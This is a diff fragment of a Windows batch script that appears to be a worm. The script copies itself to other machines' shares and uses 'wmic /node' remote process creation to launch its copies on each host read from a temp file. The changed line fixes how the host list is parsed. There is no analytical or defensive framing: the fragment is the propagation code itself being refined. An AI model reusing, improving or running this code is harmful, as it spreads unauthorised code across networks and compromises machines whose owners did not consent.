@@ -60,7 +60,7 @@ copy /y %0 "%%i\Users\Public\Documents"
 goto :eof
 
 REM Now it then try to run its copies on the remote machine 
-for /f "tokens=1" %%i in (%USERPROFILE%\Downloads\netv.tmp) do (
+for /f "delims=\\ tokens=1" %%i in (%USERPROFILE%\Downloads\netv.tmp) do (
 wmic /node:%%i process call create "cmd.exe %USERPROFILE%\w3e.bat" >nul
 start %%i\w3e.bat
 rem second choice
